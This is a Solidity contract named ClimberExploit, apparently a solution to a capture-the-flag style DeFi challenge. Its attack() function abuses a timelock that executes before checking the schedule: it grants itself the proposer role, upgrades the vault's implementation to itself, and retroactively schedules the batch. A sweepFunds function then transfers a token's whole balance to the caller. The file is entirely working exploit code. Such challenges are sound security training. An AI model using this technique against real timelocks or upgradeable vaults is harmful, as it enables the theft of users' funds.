// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "hardhat/console.sol";

interface IClimberTimelock {
    function execute(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external payable;

    function schedule(
        address[] calldata targets,
        uint256[] calldata values,
        bytes[] calldata dataElements,
        bytes32 salt
    ) external;
}

contract ClimberExploit is Initializable, OwnableUpgradeable, UUPSUpgradeable {
    int256 public constant WAITING_PERIOD = 15 days;

    uint256 private _lastWithdrawalTimestamp;
    address private _sweeper;

    bytes32 public constant ADMIN_ROLE = keccak256("ADMIN_ROLE");
    bytes32 public constant PROPOSER_ROLE = keccak256("PROPOSER_ROLE");

    IClimberTimelock public climberTimelock;
    address public immutable climberVault;

    address[] private targets;
    uint256[] private values = new uint256[](3);
    bytes[] private dataElements;

    constructor(IClimberTimelock _timelock, address _climberVault) {
        climberTimelock = _timelock;
        climberVault = _climberVault;
    }

    function sweepFunds(address tokenAddress) external {
        IERC20 token = IERC20(tokenAddress);
        require(
            token.transfer(msg.sender, token.balanceOf(address(this))),
            "Transfer failed"
        );
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation)
        internal
        override
        onlyOwner
    {}

    function attack() external {
        // Grant proposer role to this contract so we can schedule actions
        targets.push(address(climberTimelock));
        dataElements.push(
            abi.encodeWithSignature(
                "grantRole(bytes32,address)",
                PROPOSER_ROLE,
                address(this)
            )
        );

        targets.push(climberVault);
        dataElements.push(
            abi.encodeWithSignature("upgradeTo(address)", address(this))
        );

        targets.push(address(this));
        dataElements.push(abi.encodeWithSignature("schedule()"));

        climberTimelock.execute(targets, values, dataElements, "SALT");
    }

    function schedule() public {
        climberTimelock.schedule(targets, values, dataElements, "SALT");
    }
}
